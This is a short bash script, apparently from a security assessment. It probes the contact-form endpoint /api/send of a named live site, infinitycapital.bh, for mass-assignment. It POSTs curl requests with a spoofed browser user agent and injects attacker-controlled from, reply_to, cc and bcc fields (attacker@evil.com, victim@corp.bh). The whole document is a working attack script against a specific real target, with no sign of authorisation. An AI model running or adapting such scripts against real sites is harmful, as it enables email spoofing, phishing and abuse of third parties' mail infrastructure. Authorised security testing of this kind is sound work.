#!/bin/bash
cd /work
U="https://www.infinitycapital.bh"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
O=tool_outputs/cf; mkdir -p $O
T="delivered@resend.dev"

echo "### Mass-assignment: attacker-controlled from/replyTo on /api/send"
for extra in "from=attacker@evil.com" "reply_to=attacker@evil.com" "replyTo=attacker@evil.com" "cc=victim@corp.bh" "bcc=victim@corp.bh"; do
  r=$(curl -s -A "$UA" -X POST "$U/api/send" \
    --data-urlencode "fname=ICMARKER7" --data-urlencode "lname=T" --data-urlencode "areacode=973" \
    --data-urlencode "tel=3612345" --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=MA test" \
    --data-urlencode "msg=ma" --data-urlencode "check=on" --data-urlencode "targets=$T" --data-urlencode "$extra")
  echo "[$extra] -> $r"
  sleep 5
done
